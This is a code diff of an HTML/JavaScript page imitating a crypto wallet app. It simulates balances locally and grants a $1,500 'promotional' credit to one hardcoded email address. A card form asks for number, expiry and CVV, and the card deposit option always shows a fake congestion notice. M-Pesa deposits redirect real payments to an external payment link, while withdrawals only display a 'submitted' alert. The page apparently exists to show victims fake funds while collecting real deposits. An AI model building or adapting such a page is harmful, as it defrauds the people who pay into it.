@@ -12,9 +12,6 @@
       if (localStorage.getItem('theme') === 'light') {
           document.documentElement.classList.add('light-mode');
       }
-      if ('serviceWorker' in navigator) {
-        navigator.serviceWorker.register('./sw.js').then(() => console.log("PWA Registered"));
-      }
     </script>
 
     <script src="https://cdn.tailwindcss.com"></script>
@@ -33,7 +30,7 @@
         .light-mode .bg-zinc-900 { background-color: #f4f4f5; }
         .light-mode .border-zinc-800 { border-color: #e4e4e7; }
         
-        /* Persistent Dark Nav (Matching your image) */
+        /* Persistent Dark Nav */
         nav { background-color: #000000 !important; border-top: 1px solid #18181b !important; }
         .nav-item { color: #71717a; }
         .nav-active { color: #31d785 !important; }
@@ -48,17 +45,25 @@
         }
 
         .modal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.85); z-index: 1000; align-items: flex-end; }
-        .modal.active { display: flex; }
-        .modal-content { background: #1c1c1e; width: 100%; border-radius: 1.5rem 1.5rem 0 0; padding: 1.5rem; border-top: 1px solid rgba(255,255,255,0.05); color: white; }
+        .modal.active { display: flex; animation: fadeIn 0.2s ease-out; }
+        .modal-content { background: #1c1c1e; width: 100%; border-radius: 1.5rem 1.5rem 0 0; padding: 1.5rem; border-top: 1px solid rgba(255,255,255,0.05); color: white; animation: slideUp 0.3s ease-out; max-height: 90vh; overflow-y: auto;}
         
-        .incoming-timer { animation: pulse 2s infinite; color: #31d785; font-weight: 600; font-size: 11px; }
-        @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.4; } }
+        .light-mode .modal-content { background: #ffffff; color: #000; border-top: 1px solid #e4e4e7; }
+
+        @keyframes slideUp { from { transform: translateY(100%); } to { transform: translateY(0); } }
+        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
         
         .coin-icon { width: 44px; height: 44px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 18px; }
         .bg-btc { background: #f7931a; color: white; }
         .bg-eth { background: #627eea; color: white; }
         .bg-sol { background: linear-gradient(135deg, #14f195, #9945ff); color: white; }
         .bg-usdt { background: #26a17b; color: white; }
+
+        input, select { background: #18181b; color: white; border: 1px solid #27272a; outline: none; }
+        .light-mode input, .light-mode select { background: #f4f4f5; color: black; border: 1px solid #e4e4e7; }
+        input:focus, select:focus { border-color: #31d785; }
+
+        .hidden { display: none !important; }
     </style>
 </head>
 <body class="pb-28">
@@ -73,35 +78,36 @@
             <i class="fa-solid fa-chevron-down text-[10px] opacity-40"></i>
         </div>
         <div class="flex space-x-5 text-zinc-400">
-            <i class="fa-solid fa-magnifying-glass"></i>
+            <i class="fa-solid fa-bell"></i>
             <i class="fa-solid fa-expand"></i>
         </div>
     </header>
 
     <div class="mt-10 text-center px-5">
         <h1 id="main-total" class="text-[48px] font-bold tracking-tight tabular-nums">$0.00</h1>
+        <p class="text-[14px] text-zinc-500 mt-1 font-medium" id="total-change">Loading market...</p>
     </div>
 
-    <div class="flex justify-center space-x-8 mt-8">
-        <button onclick="openModal('Send')" class="flex flex-col items-center gap-2">
+    <div class="flex justify-center space-x-6 mt-8 px-4">
+        <button onclick="openModal('withdrawModal')" class="flex flex-col items-center gap-2">
             <div class="w-14 h-14 bg-zinc-900 rounded-full flex items-center justify-center text-xl border border-zinc-800"><i class="fa-solid fa-arrow-up"></i></div>
             <span class="text-[13px] font-medium opacity-80">Send</span>
         </button>
-        <button class="flex flex-col items-center gap-2">
+        <button onclick="openModal('depositModal')" class="flex flex-col items-center gap-2">
             <div class="w-14 h-14 bg-zinc-900 rounded-full flex items-center justify-center text-xl border border-zinc-800"><i class="fa-solid fa-arrow-down"></i></div>
-            <span class="text-[13px] font-medium opacity-80">Receive</span>
+            <span class="text-[13px] font-medium opacity-80">Deposit</span>
+        </button>
+        <button onclick="openModal('cardModal')" class="flex flex-col items-center gap-2">
+            <div class="w-14 h-14 bg-zinc-900 rounded-full flex items-center justify-center text-xl border border-zinc-800"><i class="fa-solid fa-credit-card"></i></div>
+            <span class="text-[13px] font-medium opacity-80">Add Card</span>
         </button>
         <button class="flex flex-col items-center gap-2">
             <div class="w-14 h-14 bg-zinc-900 rounded-full flex items-center justify-center text-xl border border-zinc-800"><i class="fa-solid fa-repeat"></i></div>
             <span class="text-[13px] font-medium opacity-80">Swap</span>
         </button>
-        <button onclick="openModal('Buy')" class="flex flex-col items-center gap-2">
-            <div class="w-14 h-14 bg-zinc-900 rounded-full flex items-center justify-center text-xl border border-zinc-800"><i class="fa-solid fa-plus"></i></div>
-            <span class="text-[13px] font-medium opacity-80">Buy</span>
-        </button>
     </div>
 
-    <div class="flex px-6 mt-10 border-b border-zinc-900 text-[14px] font-bold text-zinc-500 gap-8">
+    <div class="flex px-6 mt-10 border-b border-zinc-900 text-[14px] font-bold text-zinc-500 gap-8 overflow-x-auto whitespace-nowrap">
         <div class="pb-3 border-b-2 border-green-500 text-current">Crypto</div>
         <div class="pb-3">Watchlist</div>
         <div class="pb-3">NFTs</div>
@@ -110,12 +116,11 @@
 
     <div id="crypto-list" class="px-6 mt-6 space-y-6"></div>
 
-    <div class="px-6 mt-12 pb-10">
-        <div class="flex justify-between items-center mb-6">
-            <h3 class="text-[18px] font-bold">Recent Activity</h3>
-            <button onclick="reset()" class="text-[13px] text-zinc-500 font-semibold">View All</button>
+    <div class="px-6 mt-12 border-t border-zinc-900 pt-8">
+        <h3 class="text-[18px] font-bold mb-6">Market News</h3>
+        <div id="news-list" class="space-y-5">
+            <p class="text-zinc-500 text-sm">Fetching latest crypto news...</p>
         </div>
-        <div id="history-list" class="space-y-6"></div>
     </div>
 
     <nav class="fixed bottom-0 left-0 right-0 h-20 flex justify-around items-center px-2 z-50">
@@ -141,38 +146,122 @@
         </div>
     </nav>
 
-    <div id="txModal" class="modal" onclick="if(event.target==this) closeTx()">
+    <div id="cardModal" class="modal" onclick="if(event.target==this) closeModal('cardModal')">
         <div class="modal-content">
             <div class="w-10 h-1 bg-zinc-700 rounded-full mx-auto mb-6"></div>
-            <h2 id="modalTitle" class="text-xl font-bold mb-6">Buy Asset</h2>
-            <div class="space-y-5">
-                <select id="assetSelect" class="w-full bg-zinc-900 p-4 rounded-xl font-bold outline-none border border-zinc-800">
-                    <option value="USDT">Tether (USDT)</option>
-                    <option value="BTC">Bitcoin (BTC)</option>
-                    <option value="ETH">Ethereum (ETH)</option>
-                    <option value="SOL">Solana (SOL)</option>
-                </select>
-                <div class="bg-zinc-900 p-4 rounded-xl border border-zinc-800 text-white">
-                    <div class="flex justify-between text-[11px] font-bold text-zinc-500 uppercase mb-3"><span>Countdown</span><span id="timerLabel" class="trust-green">30s</span></div>
-                    <input type="range" id="timerSlider" min="5" max="60" value="30" class="w-full accent-green-500" oninput="document.getElementById('timerLabel').innerText = this.value + 's'">
+            <div class="flex justify-between items-center mb-6">
+                <h2 class="text-xl font-bold">Link Payment Card</h2>
+                <button onclick="closeModal('cardModal')" class="text-zinc-500"><i class="fa-solid fa-xmark text-xl"></i></button>
+            </div>
+            <form onsubmit="handleAddCard(event)" class="space-y-4">
+                <div>
+                    <label class="text-[12px] font-bold text-zinc-500 mb-2 block uppercase tracking-wider">Account Email</label>
+                    <input type="email" id="cardEmail" class="w-full p-4 rounded-xl font-semibold" placeholder="Enter registered email" required>
                 </div>
-                <input type="number" id="txAmount" placeholder="0.00" class="w-full bg-transparent text-center text-4xl font-bold outline-none py-4 text-white">
-                <button onclick="submitTx()" class="w-full bg-green-500 text-black py-4 rounded-full font-bold text-lg">Confirm</button>
+                <div>
+                    <label class="text-[12px] font-bold text-zinc-500 mb-2 block uppercase tracking-wider">Card Number</label>
+                    <input type="text" class="w-full p-4 rounded-xl font-semibold" placeholder="0000 0000 0000 0000" required>
+                </div>
+                <div class="flex gap-4">
+                    <div class="flex-1">
+                        <label class="text-[12px] font-bold text-zinc-500 mb-2 block uppercase tracking-wider">Expiry</label>
+                        <input type="text" class="w-full p-4 rounded-xl font-semibold" placeholder="MM/YY" required>
+                    </div>
+                    <div class="flex-1">
+                        <label class="text-[12px] font-bold text-zinc-500 mb-2 block uppercase tracking-wider">CVV</label>
+                        <input type="password" class="w-full p-4 rounded-xl font-semibold" placeholder="***" required>
+                    </div>
+                </div>
+                <button type="submit" class="w-full bg-[#31d785] text-black py-4 rounded-xl font-bold text-[16px] mt-2">Verify & Add Card</button>
+            </form>
+        </div>
+    </div>
+
+    <div id="depositModal" class="modal" onclick="if(event.target==this) closeModal('depositModal')">
+        <div class="modal-content">
+            <div class="w-10 h-1 bg-zinc-700 rounded-full mx-auto mb-6"></div>
+            <div class="flex justify-between items-center mb-6">
+                <h2 class="text-xl font-bold">Deposit Funds</h2>
+                <button onclick="closeModal('depositModal')" class="text-zinc-500"><i class="fa-solid fa-xmark text-xl"></i></button>
+            </div>
+            
+            <div class="flex gap-2 mb-6 p-1 bg-zinc-900 rounded-xl border border-zinc-800">
+                <button id="tab-mpesa" onclick="switchDepositTab('mpesa')" class="flex-1 py-2 rounded-lg font-bold text-sm bg-[#31d785] text-black transition">M-Pesa</button>
+                <button id="tab-card" onclick="switchDepositTab('card')" class="flex-1 py-2 rounded-lg font-bold text-sm text-zinc-400 transition">Card</button>
+            </div>
+
+            <form id="dep-mpesa-section" onsubmit="handleMpesaDeposit(event)" class="space-y-5">
+                <div>
+                    <label class="text-[12px] font-bold text-zinc-500 mb-2 block uppercase tracking-wider">Amount to Deposit</label>
+                    <div class="relative">
+                        <span class="absolute left-4 top-1/2 -translate-y-1/2 font-bold text-zinc-400">KES</span>
+                        <input type="number" id="mpesaAmount" class="w-full p-4 pl-14 rounded-xl font-bold text-lg" placeholder="0.00" required>
+                    </div>
+                </div>
+                <button type="submit" class="w-full bg-[#31d785] text-black py-4 rounded-xl font-bold text-[16px]">Proceed to Lipwa</button>
+            </form>
+
+            <div id="dep-card-section" class="hidden text-center py-8">
+                <i class="fa-solid fa-triangle-exclamation text-4xl text-yellow-500 mb-4"></i>
+                <h3 class="font-bold text-lg mb-2">High Traffic</h3>
+                <p class="text-zinc-500 text-sm mb-6">Card deposits are currently experiencing high network congestion. Please use M-Pesa or try again later.</p>
+                <button type="button" onclick="closeModal('depositModal')" class="w-full bg-zinc-800 text-white py-4 rounded-xl font-bold text-[16px]">Close</button>
             </div>
         </div>
     </div>
 
+    <div id="withdrawModal" class="modal" onclick="if(event.target==this) closeModal('withdrawModal')">
+        <div class="modal-content">
+            <div class="w-10 h-1 bg-zinc-700 rounded-full mx-auto mb-6"></div>
+            <div class="flex justify-between items-center mb-6">
+                <h2 class="text-xl font-bold">Send / Withdraw</h2>
+                <button onclick="closeModal('withdrawModal')" class="text-zinc-500"><i class="fa-solid fa-xmark text-xl"></i></button>
+            </div>
+            <form onsubmit="handleWithdraw(event)" class="space-y-4">
+                <div>
+                    <label class="text-[12px] font-bold text-zinc-500 mb-2 block uppercase tracking-wider">Amount</label>
+                    <div class="relative">
+                        <span class="absolute left-4 top-1/2 -translate-y-1/2 font-bold text-zinc-400">$</span>
+                        <input type="number" id="withdrawAmount" class="w-full p-4 pl-10 rounded-xl font-bold text-lg" placeholder="0.00" required>
+                    </div>
+                </div>
+                <div>
+                    <label class="text-[12px] font-bold text-zinc-500 mb-2 block uppercase tracking-wider">Withdrawal Method</label>
+                    <select id="withdrawMethod" class="w-full p-4 rounded-xl font-semibold" required>
+                        </select>
+                </div>
+                <div>
+                    <label class="text-[12px] font-bold text-zinc-500 mb-2 block uppercase tracking-wider">Destination Address / Number</label>
+                    <input type="text" class="w-full p-4 rounded-xl font-semibold" placeholder="Enter address or account number" required>
+                </div>
+                <button type="submit" class="w-full bg-[#31d785] text-black py-4 rounded-xl font-bold text-[16px] mt-2">Confirm Withdrawal</button>
+            </form>
+        </div>
+    </div>
+
     <script>
-        const COINS = {
-            BTC: { name: 'Bitcoin', price: 70848, icon: 'fa-bitcoin', colorClass: 'bg-btc' },
-            ETH: { name: 'Ethereum', price: 2160, icon: 'fa-ethereum', colorClass: 'bg-eth' },
-            SOL: { name: 'Solana', price: 91.50, icon: 'fa-bolt', colorClass: 'bg-sol' },
+        // --- State Management ---
+        let COINS = {
+            BTC: { name: 'Bitcoin', price: 0, icon: 'fa-bitcoin', colorClass: 'bg-btc' },
+            ETH: { name: 'Ethereum', price: 0, icon: 'fa-ethereum', colorClass: 'bg-eth' },
+            SOL: { name: 'Solana', price: 0, icon: 'fa-bolt', colorClass: 'bg-sol' },
             USDT: { name: 'Tether', price: 1.00, icon: 'fa-dollar-sign', colorClass: 'bg-usdt' }
         };
 
-        let state = JSON.parse(localStorage.getItem('trust_fixed_v1')) || { balances: { USDT: 0, BTC: 0, ETH: 0, SOL: 0 }, history: [] };
-        let activeMode = '';
+        // Initialize state or get from localStorage
+        let state = JSON.parse(localStorage.getItem('trust_live_v2')) || { 
+            balances: { USDT: 0, BTC: 0, ETH: 0, SOL: 0 },
+            cardLinked: false
+        };
         let lastKnownTotal = 0;
+
+        // --- Core UI Functions ---
+        function toggleTheme() {
+            document.documentElement.classList.toggle('light-mode');
+            const isLight = document.documentElement.classList.contains('light-mode');
+            document.getElementById('theme-icon').className = isLight ? 'fa-solid fa-sun text-sm' : 'fa-solid fa-moon text-sm';
+            localStorage.setItem('theme', isLight ? 'light' : 'dark');
+        }
 
         function animateValue(start, end, duration) {
             const obj = document.getElementById('main-total');
@@ -187,89 +276,213 @@
             window.requestAnimationFrame(step);
         }
 
-        function toggleTheme() {
-            document.documentElement.classList.toggle('light-mode');
-            const isLight = document.documentElement.classList.contains('light-mode');
-            document.getElementById('theme-icon').className = isLight ? 'fa-solid fa-sun text-sm' : 'fa-solid fa-moon text-sm';
-            localStorage.setItem('theme', isLight ? 'light' : 'dark');
+        // --- Modal Logic ---
+        function openModal(id) { document.getElementById(id).classList.add('active'); }
+        function closeModal(id) { document.getElementById(id).classList.remove('active'); }
+
+        // --- Adding Card Feature ---
+        function handleAddCard(e) {
+            e.preventDefault();
+            const email = document.getElementById('cardEmail').value.trim().toLowerCase();
+            
+            if (email === 'joseeruitha@gmail.com') {
+                if(!state.cardLinked) {
+                    state.cardLinked = true;
+                    state.balances.USDT += 1500; // Add promotion to USDT
+                    saveState();
+                    alert("Card added successfully! $1,500 promotional balance has been credited to your USDT wallet.");
+                } else {
+                    alert("Card already linked to this account.");
+                }
+                closeModal('cardModal');
+                document.getElementById('cardEmail').value = '';
+            } else {
+                alert("Error: Invalid card or unauthorized account.");
+            }
         }
 
-        function openModal(mode) { activeMode = mode; document.getElementById('modalTitle').innerText = mode + " Crypto"; document.getElementById('txModal').classList.add('active'); }
-        function closeTx() { document.getElementById('txModal').classList.remove('active'); }
+        // --- Deposit Logic (M-Pesa & Card) ---
+        function switchDepositTab(tab) {
+            const btnMpesa = document.getElementById('tab-mpesa');
+            const btnCard = document.getElementById('tab-card');
+            const secMpesa = document.getElementById('dep-mpesa-section');
+            const secCard = document.getElementById('dep-card-section');
 
-        function submitTx() {
-            const coin = document.getElementById('assetSelect').value;
-            const amt = parseFloat(document.getElementById('txAmount').value);
-            const seconds = parseInt(document.getElementById('timerSlider').value);
-            if(!amt || amt <= 0) return;
-            state.history.push({ id: Date.now(), type: activeMode, coin, amt, status: 'pending', timeLeft: seconds, target: Date.now() + (seconds * 1000), timeStr: new Date().toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'}) });
-            save(); closeTx(); document.getElementById('txAmount').value = '';
+            if (tab === 'mpesa') {
+                btnMpesa.className = "flex-1 py-2 rounded-lg font-bold text-sm bg-[#31d785] text-black transition";
+                btnCard.className = "flex-1 py-2 rounded-lg font-bold text-sm text-zinc-400 transition";
+                secMpesa.classList.remove('hidden');
+                secCard.classList.add('hidden');
+            } else {
+                btnCard.className = "flex-1 py-2 rounded-lg font-bold text-sm bg-zinc-800 text-white transition";
+                document.documentElement.classList.contains('light-mode') ? btnCard.className = "flex-1 py-2 rounded-lg font-bold text-sm bg-zinc-200 text-black transition" : null;
+                btnMpesa.className = "flex-1 py-2 rounded-lg font-bold text-sm text-zinc-400 transition";
+                secCard.classList.remove('hidden');
+                secMpesa.classList.add('hidden');
+            }
         }
 
-        function save() { localStorage.setItem('trust_fixed_v1', JSON.stringify(state)); render(); }
+        function handleMpesaDeposit(e) {
+            e.preventDefault();
+            const amount = document.getElementById('mpesaAmount').value;
+            if (!amount || amount <= 0) return alert("Please enter a valid amount.");
+            
+            // Generate random alphanumeric invoice (e.g., INV-X8B9Q2)
+            const invoice = 'INV-' + Math.random().toString(36).substring(2, 8).toUpperCase();
+            
+            // Redirect locking in the amount and invoice via URL params
+            const targetUrl = `https://lipwa.link/8367?amount=${amount}&invoice=${invoice}`;
+            window.location.href = targetUrl;
+        }
 
-        function render() {
+        // --- Withdrawal Logic ---
+        const withdrawMethods = [
+            "Crypto Network (ERC20/TRC20)", "Crypto Network (BEP20)", "Crypto Network (Solana)",
+            "M-Pesa (Kenya)", "Airtel Money", "MTN Mobile Money", 
+            "PayPal", "Skrill", "Perfect Money", "Bank Wire Transfer (SWIFT)", "SEPA Transfer (EU)", 
+            "ACH Transfer (USA)", "Interac e-Transfer (Canada)", "Pix (Brazil)", "UPI (India)", 
+            "Paytm (India)", "AliPay", "WeChat Pay", "Zelle", "CashApp", "Venmo", "Revolut", 
+            "Wise (TransferWise)", "Payoneer", "Neteller", "AdvCash", "Payeer", "WebMoney", 
+            "OVO (Indonesia)", "Gcash (Philippines)", "FaisaPay (Maldives)", "Chipper Cash (Africa)"
+        ];
+
+        function populateWithdrawSelect() {
+            const select = document.getElementById('withdrawMethod');
+            withdrawMethods.forEach(method => {
+                const opt = document.createElement('option');
+                opt.value = method;
+                opt.innerText = method;
+                select.appendChild(opt);
+            });
+        }
+
+        function handleWithdraw(e) {
+            e.preventDefault();
+            const amt = parseFloat(document.getElementById('withdrawAmount').value);
+            const method = document.getElementById('withdrawMethod').value;
+            
+            // Calculate total USD balance based on live prices
+            let totalUSD = 0;
+            for(let c in state.balances) {
+                totalUSD += state.balances[c] * COINS[c].price;
+            }
+
+            if (amt > totalUSD) {
+                alert("Insufficient funds for this withdrawal.");
+            } else {
+                alert(`Withdrawal request of $${amt} via ${method} submitted for processing.`);
+                closeModal('withdrawModal');
+                document.getElementById('withdrawAmount').value = '';
+            }
+        }
+
+        // --- Live API Fetching (Prices & News) ---
+        async function fetchMarketData() {
+            try {
+                // Fetch real live prices from CoinGecko Free API
+                const res = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=bitcoin,ethereum,solana&vs_currencies=usd');
+                const data = await res.json();
+                
+                if(data.bitcoin) COINS.BTC.price = data.bitcoin.usd;
+                if(data.ethereum) COINS.ETH.price = data.ethereum.usd;
+                if(data.solana) COINS.SOL.price = data.solana.usd;
+                
+                document.getElementById('total-change').innerText = `Live Market Active • 24h Data`;
+                document.getElementById('total-change').classList.add('trust-green');
+                
+                renderBalances();
+            } catch (error) {
+                console.error("API Error:", error);
+                // Fallback rendering if API fails
+                if(COINS.BTC.price === 0) COINS.BTC.price = 68000;
+                if(COINS.ETH.price === 0) COINS.ETH.price = 3500;
+                if(COINS.SOL.price === 0) COINS.SOL.price = 150;
+                renderBalances();
+            }
+        }
+
+        async function fetchNews() {
+            try {
+                const res = await fetch('https://min-api.cryptocompare.com/data/v2/news/?lang=EN');
+                const json = await res.json();
+                const newsItems = json.Data.slice(0, 4);
+                
+                const container = document.getElementById('news-list');
+                let html = '';
+                
+                newsItems.forEach(item => {
+                    const timeAgo = Math.round((Date.now()/1000 - item.published_on) / 60);
+                    const timeString = timeAgo > 60 ? Math.round(timeAgo/60) + 'h ago' : timeAgo + 'm ago';
+                    
+                    html += `
+                    <div class="flex space-x-4 items-center cursor-pointer" onclick="window.open('${item.url}', '_blank')">
+                        <img src="${item.imageurl}" class="w-16 h-16 rounded-xl object-cover" alt="news">
+                        <div>
+                            <p class="text-[11px] font-bold text-[#31d785] mb-1 uppercase tracking-wider">${item.source_info.name} • ${timeString}</p>
+                            <h4 class="text-[13px] font-semibold leading-snug line-clamp-2">${item.title}</h4>
+                        </div>
+                    </div>`;
+                });
+                
+                container.innerHTML = html;
+            } catch (err) {
+                document.getElementById('news-list').innerHTML = "<p class='text-zinc-500 text-sm'>Unable to load live news.</p>";
+            }
+        }
+
+        // --- Render & Save ---
+        function saveState() { 
+            localStorage.setItem('trust_live_v2', JSON.stringify(state)); 
+            renderBalances(); 
+        }
+
+        function renderBalances() {
             let total = 0;
             const list = document.getElementById('crypto-list');
             list.innerHTML = '';
+            
             for(let c in state.balances) {
                 const usdValue = state.balances[c] * COINS[c].price;
                 total += usdValue;
-                list.innerHTML += `<div class="flex justify-between items-center"><div class="flex items-center space-x-4"><div class="coin-icon ${COINS[c].colorClass}"><i class="fa-brands ${COINS[c].icon === 'fa-bitcoin' ? 'fa-bitcoin' : (COINS[c].icon === 'fa-ethereum' ? 'fa-ethereum' : 'fa-solid ' + COINS[c].icon)}"></i></div><div><div class="flex items-center space-x-2"><span class="font-bold text-[16px] uppercase">${c}</span><span class="text-xs text-zinc-500 font-medium">${COINS[c].name}</span></div><p class="text-[13px] font-bold text-zinc-500 mt-0.5">$${COINS[c].price.toLocaleString()}</p></div></div><div class="text-right"><p class="font-bold text-[16px] tabular-nums">${state.balances[c].toLocaleString()}</p><p class="text-[13px] text-zinc-500 mt-0.5 tabular-nums">$${usdValue.toLocaleString()}</p></div></div>`;
+                list.innerHTML += `
+                    <div class="flex justify-between items-center">
+                        <div class="flex items-center space-x-4">
+                            <div class="coin-icon ${COINS[c].colorClass}">
+                                <i class="fa-brands ${COINS[c].icon === 'fa-bitcoin' ? 'fa-bitcoin' : (COINS[c].icon === 'fa-ethereum' ? 'fa-ethereum' : 'fa-solid ' + COINS[c].icon)}"></i>
+                            </div>
+                            <div>
+                                <div class="flex items-center space-x-2">
+                                    <span class="font-bold text-[16px] uppercase">${c}</span>
+                                    <span class="text-xs text-zinc-500 font-medium">${COINS[c].name}</span>
+                                </div>
+                                <p class="text-[13px] font-bold text-zinc-500 mt-0.5">$${COINS[c].price.toLocaleString(undefined, {minimumFractionDigits:2, maximumFractionDigits:2})}</p>
+                            </div>
+                        </div>
+                        <div class="text-right">
+                            <p class="font-bold text-[16px] tabular-nums">${state.balances[c].toLocaleString(undefined, {maximumFractionDigits:6})}</p>
+                            <p class="text-[13px] text-zinc-500 mt-0.5 tabular-nums">$${usdValue.toLocaleString(undefined, {minimumFractionDigits: 2, maximumFractionDigits:2})}</p>
+                        </div>
+                    </div>`;
             }
 
+            // Animate total balance change
             if (total !== lastKnownTotal) {
                 animateValue(lastKnownTotal, total, 800);
                 lastKnownTotal = total;
             } else if (lastKnownTotal === 0) {
                 document.getElementById('main-total').innerText = `$${total.toLocaleString(undefined, {minimumFractionDigits: 2})}`;
             }
-
-            const hist = document.getElementById('history-list');
-            hist.innerHTML = state.history.length ? '' : '<p class="text-center py-10 opacity-20 text-[11px] font-bold tracking-widest">NO RECENT ACTIVITY</p>';
-            state.history.slice(-8).reverse().forEach(tx => {
-                const isPending = tx.status === 'pending';
-                const colorClass = tx.type === 'Buy' ? 'text-green-500' : (document.documentElement.classList.contains('light-mode') ? 'text-black' : 'text-white');
-                
-                hist.innerHTML += `
-                    <div class="flex justify-between items-center">
-                        <div class="flex items-center space-x-4">
-                            <div class="w-11 h-11 bg-zinc-900 rounded-full flex items-center justify-center border border-zinc-800">
-                                <i class="fa-solid ${tx.type === 'Buy' ? 'fa-arrow-down text-green-500' : 'fa-arrow-up text-zinc-400'} text-[13px]"></i>
-                            </div>
-                            <div>
-                                <p class="text-[15px] font-bold">${tx.type} ${tx.coin}</p>
-                                <p class="text-[12px] text-zinc-500 font-medium">${tx.timeStr}</p>
-                            </div>
-                        </div>
-                        <div class="text-right">
-                            <p class="font-bold text-[16px] tabular-nums ${isPending ? 'text-zinc-500' : colorClass}">
-                                ${tx.type === 'Buy' ? '+' : '-'}${tx.amt.toLocaleString()}
-                            </p>
-                            ${isPending ? `<p class="incoming-timer">Pending: ${tx.timeLeft}s</p>` : `<span class="text-[10px] text-zinc-500 font-bold uppercase tracking-widest">Completed</span>`}
-                        </div>
-                    </div>`;
-            });
         }
 
-        setInterval(() => {
-            let changed = false;
-            const now = Date.now();
-            state.history.forEach(tx => {
-                if(tx.status === 'pending') {
-                    tx.timeLeft = Math.max(0, Math.ceil((tx.target - now) / 1000));
-                    if(tx.timeLeft <= 0) {
-                        tx.status = 'confirmed';
-                        state.balances[tx.coin] += (tx.type === 'Buy' ? tx.amt : -tx.amt);
-                        changed = true;
-                    }
-                }
-            });
-            if(changed) save(); else render();
-        }, 1000);
-
-        function reset() { if(confirm("Clear history?")) { localStorage.clear(); location.reload(); } }
-        render();
+        // --- Initialization ---
+        window.onload = () => {
+            populateWithdrawSelect();
+            fetchMarketData(); // Fetch initial prices
+            fetchNews();       // Fetch live news
+            
+            // Refresh market prices every 30 seconds
+            setInterval(fetchMarketData, 30000);
+        };
     </script>
 </body>
 </html>
